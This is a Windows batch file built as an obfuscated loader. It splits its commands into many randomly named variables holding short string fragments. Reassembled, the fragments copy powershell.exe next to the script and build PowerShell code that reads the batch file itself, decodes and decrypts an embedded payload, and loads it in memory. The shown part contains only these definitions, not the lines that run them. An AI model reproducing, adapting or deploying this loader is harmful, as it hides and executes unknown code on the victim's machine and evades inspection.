@echo off
set "XGHVVqYPOr=rs"
set "dFunEMRAeJ=ll"
set "jQaetBNayw=rS"
set "BuXDijQPds=Po"
set "rZDAktYOqF=0\"
set "xFmmhVSkFU=ow"
set "kXdFfAFSJp=st"
set "kbrhbVKfFy=32"
set "LMElgpAlPg=po"
set "RRjARpyrKR=he"
set "bbkCdIzJvt=in"
set "mlhtKPMEoj=\W"
set "vQqHBERjuz=1."
set "ejFvSfVjdH=nd"
set "MEDEUImeBm=he"
set "JwUSaiFWEj=do"
set "UNegHffJqP=.e"
set "PznkdHQIzV=ws"
set "jUgWaUYxVO=py"
set "eFmKvGEQYZ=co"
set "ouJxfrmtrj= /"
set "zyKexYAxWP=y "
set "vbKmPQqosB=we"
set "SXckKoZmMk=em"
set "qCqYLKtTjG=\v"
set "SncVrfhhmC=:\"
set "zZKcGOjZEM= C"
set "qLxxuqbDiN=xe"
set "VFhdwAzkKj=we"
set "rQSlOOPbvn=ll"
set "FBUgHIIGdl=Sy"
set "fSfQlKiHfx=Wi"
set "NQktJHUTRW=s\"
set "loIfLGJdAX= %~dp0"
set "IXhJUhfngD=cd"
set "UycEuVHNnp=sion"
set "QFpxengFyX='0Pg"
set "WusOOOSkAI=$idA"
set "gfpOjwmJNQ=and "
set "SmLNfSmutC=('Tg"
set "VZKwUoZeiO=$nRf"
set "pVQgGkEXYb=lBlo"
set "BFtsXHBrsX=TllA"
set "tjYEZWTIDy=IdQu"
set "pCeftUIwPg=comm"
set "DxBZMZbKCV=)($s"
set "eKSmJXgJrv=YxVw"
set "XoLdDpMePS=gMod"
set "LpjbjyyIXz= '')"
set "DDCPKcDaio=]::N"
set "IjXyQHxxEe=gth)"
set "enlHWGqxmK=k; }"
set "kyPcERziMa=e]::"
set "nwzOqJZmTD=]::("
set "GLRGUnLlQT=pres"
set "iytrxbFuHZ= if "
set "nxBQqggxPh=[]] "
set "jrZTJbJwaV=-4] "
set "fwhIQjPxou=dAxm"
set "TcNbvRGYVL=ect "
set "CjmZdNNiAs=rofi"
set "OlxayyQtnr=esaB"
set "uVgbwJxzwl=CFxo"
set "gaFhoBDfHx=dAxm"
set "iVGjEPzgaW=ecry"
set "kUguXuVNzR=pStr"
set "HhatCcfMQq=oL'["
set "VuYqglVzRq=6] -"
set "mGMjrcwpCw=('%~f0'"
set "GmAVFcrcki=in $"
set "ioJYoXpSGO=Comp"
set "kuVvvZaprs=ey ="
set "pQFlsLcVdw=idAx"
set "QOoKVSHCFX=ypto"
set "qMqFhqODSz=daeR"
set "SxgTlLdzdt=nRfe"
set "wlCJLzyBEG='gni"
set "SJceQmVMCM=nage"
set "QKdhoDqKui=Mode"
set "nSAtwMisQo=tsWi"
set "IjCISulFzl=gjYA"
set "zuAllwZsWx=[Sys"
set "UQPofcMNnl=m.IO"
set "tYsJQfDONH=stem"
set "rJNeWtCYDk=File"
set "iyaEpEGgCH=pose"
set "bEHmzmlyJW=[Sys"
set "eStBpRXOGy=tsM "
set "ruNPHsMdfh=L4Yi"
set "gRVlcgtSkT=r.En"
set "DYGNdEeiTK=.Mem"
set "pnXWkyLeQT=1..-"
